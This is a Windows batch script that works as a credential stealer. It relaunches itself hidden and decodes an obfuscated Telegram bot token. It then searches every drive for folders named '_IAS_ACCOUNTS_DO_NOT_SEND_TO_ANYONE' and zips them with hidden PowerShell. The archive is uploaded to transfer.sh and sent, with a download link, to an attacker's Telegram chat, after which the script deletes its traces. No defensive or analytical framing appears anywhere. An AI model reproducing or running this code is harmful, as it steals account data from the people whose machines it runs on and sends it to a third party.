@echo off
setlocal enabledelayedexpansion
if not "%~1"=="silent" (
    start "" /min "%~f0" silent
    exit
)


set "liYJaYCEFyvrtwAKdaQVeMvnWAYXdNNM"
set "BT_ENC=5B5168735960767C7E494C333531230D2E2F380E073718160E703831087A091B182C181F36017271084E2E5F1526"
set "CID_ENC=4158697A526E7A74724D43474547"



set "BOT_TOKEN="
set "CHAT_ID="
call :XOR_DEC %BT_ENC% BOT_TOKEN
call :XOR_DEC %CID_ENC% CHAT_ID


set "rnd="
for /l %%i in (1,1,12) do (
    set /a x=!random! %% 26
    for %%r in (!x!) do set "rnd=!rnd!!char:~%%r,1!"
)
set "rnd=!rnd!!random!"
set "workdir=%TEMP%\!rnd!"
mkdir "%workdir%" 2>nul
cd /d "%workdir%"


set "ch=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:,.<>?"
set "pass="
for /l %%i in (1,1,48) do (
    set /a r=!random! %% 89
    for %%r in (!r!) do set "pass=!pass!!ch:~%%r,1!"
)


set cnt=0
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%d:\" (
        for /f "delims=" %%a in ('dir /s /b /ad "%%d:\" 2^>nul ^| findstr /i "_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE"') do (
            set /a cnt+=1
            set "fld!cnt!=%%a"
        )
    )
)

if !cnt!==0 exit

set "final=%workdir%\vzCnxFpvmRUkcXFaeLLmSXQnCfiKexUI"
mkdir "%final%" 2>nul

for /l %%i in (1,1,!cnt!) do (
    set "src=!fld%%i!"
    set "ias=%final%\ias%%i"
    mkdir "!ias!" 2>nul
    echo !src! > "!ias!\Path.txt"
    powershell -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -command "
        Add-Type -Assembly 'System.IO.Compression';
        Add-Type -Assembly 'System.IO.Compression.FileSystem';
        \$z=[System.IO.Compression.ZipFile]::Open('!ias!\_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE.zip','Create');
        Get-ChildItem '!src!' | ForEach-Object {\$z.CreateEntry(\$_.Name,[System.IO.Compression.CompressionLevel]::Optimal)};
        \$z.Dispose()
    " 2>nul
)

powershell -NoLogo -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -command "Compress-Archive -Path '%final%\*' -DestinationPath '%workdir%\vzCnxFpvmRUkcXFaeLLmSXQnCfiKexUI.zip' -Force" 2>nul

:: Upload
curl -s --upload-file "%workdir%\vzCnxFpvmRUkcXFaeLLmSXQnCfiKexUI.zip" "https://transfer.sh/vzCnxFpvmRUkcXFaeLLmSXQnCfiKexUI.zip" > "%workdir%\link.txt"
set /p DL=<"%workdir%\link.txt"

:: Telegram
set "msg=🔥 <b>New User!</b>%%0A%%0A📡 <b>Download:</b>%%0A!DL!%%0A%%0A🔑 <b>Hasło:</b>%%0A<code>!pass!</code>%%0A%%0A📦 <b>Foldery:</b> !cnt!"
curl -s -X POST "https://api.telegram.org/bot!BOT_TOKEN!/sendMessage" -d "chat_id=!CHAT_ID!" -d "text=!msg!" -d "parse_mode=HTML" >nul
curl -s -X POST "https://api.telegram.org/bot!BOT_TOKEN!/sendDocument" -F "chat_id=!CHAT_ID!" -F "document=@%workdir%\vzCnxFpvmRUkcXFaeLLmSXQnCfiKexUI.zip" -F "caption=📦 Done" >nul

:: Clean
timeout /t 2 >nul
rmdir /s /q "%workdir%" 2>nul
del /f /q "%TEMP%\s.bat" 2>nul
exit

:XOR_DEC
set "hex=!%1!"
set "out="
set "idx=0"
:xd_loop
if "!hex!"=="" (
    set "%2=!out!"
    goto :eof
)
set "byte=!hex:~0,2!"
set "hex=!hex:~2!"
set /a "dec=0x!byte!"
set "kchar=!KEY:~%idx%,1!"
cmd /c exit /b !kchar!
set /a "kasc=!=exitcode!"
set /a "xor=!dec! ^ !kasc!"
cmd /c exit /b !xor!
set "char=!=exitcodeAscii!"
set "out=!out!!char!"
set /a idx=(!idx!+1) %% 12
goto :xd_loop